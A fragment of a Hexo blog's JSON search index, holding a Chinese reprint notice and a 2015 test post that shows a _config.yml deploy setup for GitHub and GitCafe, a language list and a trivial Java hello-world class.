原创作品，允许转载，转载时无须告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/08/08/Win10-Fedora22/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"第一日","slug":"Show","date":"2015-08-04T10:35:09.000Z","updated":"2016-11-25T06:57:56.000Z","comments":true,"path":"2015/08/04/Show/","link":"","permalink":"http://forec.github.io/2015/08/04/Show/","excerpt":"Github和Gitcafe同时push的_config.yml，测试hexo效果","text":"Github和Gitcafe同时push的_config.yml，测试hexo效果 _config.yml 部署部分： 12345deploy: type: git repo: github: git@github.com:Forec/Forec.github.io.git,master gitcafe: git@gitcafe.com:Forec/Forec.git,gitcafe-pages 在gitcafe中建立静态网页需要设置branch为gitcafe-pages 测试hexoTest - Photo Test - LanguageList c c++ java python golang haskell Test - Code Some code below 1234567package test;public class TestHexo&#123; public static void main(String...args)&#123; System.out.println(\"test\"); &#125;&#125; Test - Link This is google This is forec.cn This is forec’s github","categories":[],"tags":[],"keywords":[]}]}